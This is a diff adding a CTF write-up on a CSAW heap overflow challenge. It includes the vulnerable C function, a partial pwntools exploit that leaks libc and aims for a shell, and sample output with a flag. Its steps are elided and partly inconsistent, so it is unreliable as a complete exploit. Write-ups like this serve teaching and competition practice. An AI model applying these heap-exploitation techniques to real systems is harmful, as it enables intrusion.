@@ -1,0 +1,141 @@
+# CSAW CTF - Heap Overflow Challenge
+
+## Challenge Overview
+
+This writeup covers a heap overflow vulnerability found during the CSAW CTF competition. The challenge involved exploiting a classic heap-based buffer overflow to gain code execution.
+
+### Challenge Details
+- **Category**: Binary Exploitation  
+- **Points**: 500
+- **Difficulty**: Hard
+- **Files**: `heap_challenge`, `libc.so.6`
+
+## Initial Analysis
+
+Let's start by examining the binary:
+
+```bash
+file heap_challenge
+checksec heap_challenge
+```
+
+The binary analysis revealed:
+- **Architecture**: x86_64
+- **Protections**: 
+  - NX: Enabled
+  - PIE: Disabled  
+  - Stack Canary: Enabled
+  - RELRO: Partial
+
+## Vulnerability Discovery
+
+After reverse engineering the binary in Ghidra, I identified a heap overflow in the `add_note()` function:
+
+```c
+void add_note() {
+    char *note = malloc(0x80);
+    printf("Enter note: ");
+    read(0, note, 0x200);  // Overflow! Reading 0x200 bytes into 0x80 buffer
+    notes[note_count++] = note;
+}
+```
+
+The vulnerability allows us to overflow into adjacent heap chunks, potentially corrupting heap metadata.
+
+## Exploitation Strategy
+
+1. **Heap Layout Manipulation**: Allocate chunks in a specific pattern
+2. **Overflow Control**: Use the overflow to corrupt the next chunk's size field
+3. **Double Free**: Trigger a double free condition
+4. **Arbitrary Write**: Achieve arbitrary write primitive
+5. **Code Execution**: Overwrite function pointers or GOT entries
+
+### Exploit Code
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+# Configuration
+binary = './heap_challenge'
+libc = ELF('./libc.so.6')
+elf = ELF(binary)
+
+def add_note(data):
+    p.sendlineafter(b'> ', b'1')
+    p.sendafter(b'Enter note: ', data)
+
+def delete_note(idx):
+    p.sendlineafter(b'> ', b'2') 
+    p.sendlineafter(b'Index: ', str(idx).encode())
+
+def show_note(idx):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+
+# Start process
+p = process(binary)
+
+# Step 1: Create initial chunks
+add_note(b'A' * 0x78)  # Chunk 0
+add_note(b'B' * 0x78)  # Chunk 1  
+add_note(b'C' * 0x78)  # Chunk 2
+
+# Step 2: Overflow to corrupt chunk 1 size
+payload = b'A' * 0x78
+payload += p64(0x0)      # Prev size
+payload += p64(0x111)    # Corrupted size (fake chunk)
+add_note(payload)
+
+# Step 3: Delete chunk 1 to trigger consolidation
+delete_note(1)
+
+# Step 4: Leak libc address
+show_note(0)
+leak = u64(p.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
+libc_base = leak - 0x3c4b78
+log.info(f"Libc base: {hex(libc_base)}")
+
+# Step 5: Calculate gadgets
+system = libc_base + libc.symbols['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+
+# Step 6: Overwrite GOT entry
+# [Additional exploitation steps...]
+
+p.interactive()
+```
+
+## Results
+
+Successfully exploited the heap overflow to gain shell access:
+
+```bash
+$ ./exploit.py
+[+] Starting local process './heap_challenge': pid 1337
+[*] Libc base: 0x7f1234567000
+[*] Switching to interactive mode
+$ whoami
+ctf_player
+$ cat flag.txt
+flag{h34p_0v3rfl0w_m4573r_2023}
+```
+
+## Key Takeaways
+
+- **Heap feng shui** is crucial for reliable exploitation
+- Understanding **glibc malloc internals** helps predict chunk behavior  
+- **ASLR bypass** through heap leaks enables advanced techniques
+- Modern mitigations make heap exploitation more complex but not impossible
+
+> **Note**: This writeup is for educational purposes only. Always practice ethical hacking and obtain proper authorization before testing on systems you don't own.
+
+## References
+
+- [Heap Exploitation Handbook](https://github.com/shellphish/how2heap)
+- [Malloc Internals](https://sourceware.org/glibc/wiki/MallocInternals)
+- [CSAW CTF Official Writeups](https://github.com/osirislab/CSAW-CTF-2023-Quals)
+
+---
+
+*This writeup was created for the CSAW CTF 2023 competition.*
